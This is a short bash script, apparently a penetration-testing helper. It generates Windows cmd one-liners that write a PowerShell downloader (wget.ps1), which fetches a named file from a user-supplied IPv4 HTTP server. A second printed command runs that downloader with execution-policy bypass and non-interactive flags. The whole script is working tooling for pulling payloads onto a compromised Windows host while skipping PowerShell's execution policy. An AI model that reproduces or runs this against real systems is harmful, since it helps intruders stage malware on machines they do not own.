#!/bin/bash

# Simple script to generate a windows powershell script that will download a file from an http server

if [ $# -ne 2 ]
  then
    echo "Usage: script.sh [filename to get] [server address in IPv4 format (xx.xx.xx.xx)"
    exit 1
fi

tfile=$1
host=$2

echo "echo \$storageDir = \$pwd > wget.ps1 &  echo \$webclient = New-Object System.Net.WebClient >>wget.ps1  & echo \$url = \"http://$host/$tfile\" >>wget.ps1 & echo \$file = \"$tfile\" >>wget.ps1 & echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1"

echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"

exit 0
